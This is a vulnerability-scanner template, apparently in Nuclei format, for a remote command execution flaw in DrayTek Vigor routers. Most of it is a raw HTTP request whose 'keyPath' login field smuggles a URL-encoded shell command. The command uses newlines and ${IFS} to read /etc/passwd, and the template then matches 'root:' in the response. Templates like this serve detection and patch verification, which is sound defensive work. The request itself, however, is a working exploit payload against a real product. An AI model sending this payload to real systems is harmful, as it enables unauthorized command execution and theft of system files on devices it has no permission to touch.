id: draytek-vigor-rce
info:
  name: DrayTek Vigor Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - raw:
      - |
        POST /cgi-bin/mainfunction.cgi HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
        Content-Type: application/x-www-form-urlencoded

        action=login&keyPath=%27%0A%2fbin%2fcat%24%7BIFS%7D%252fetc%252fpasswd%0A%27&loginUser=a&loginPwd=a
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
        part: body
      - type: word
        words:
          - "/bin"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true
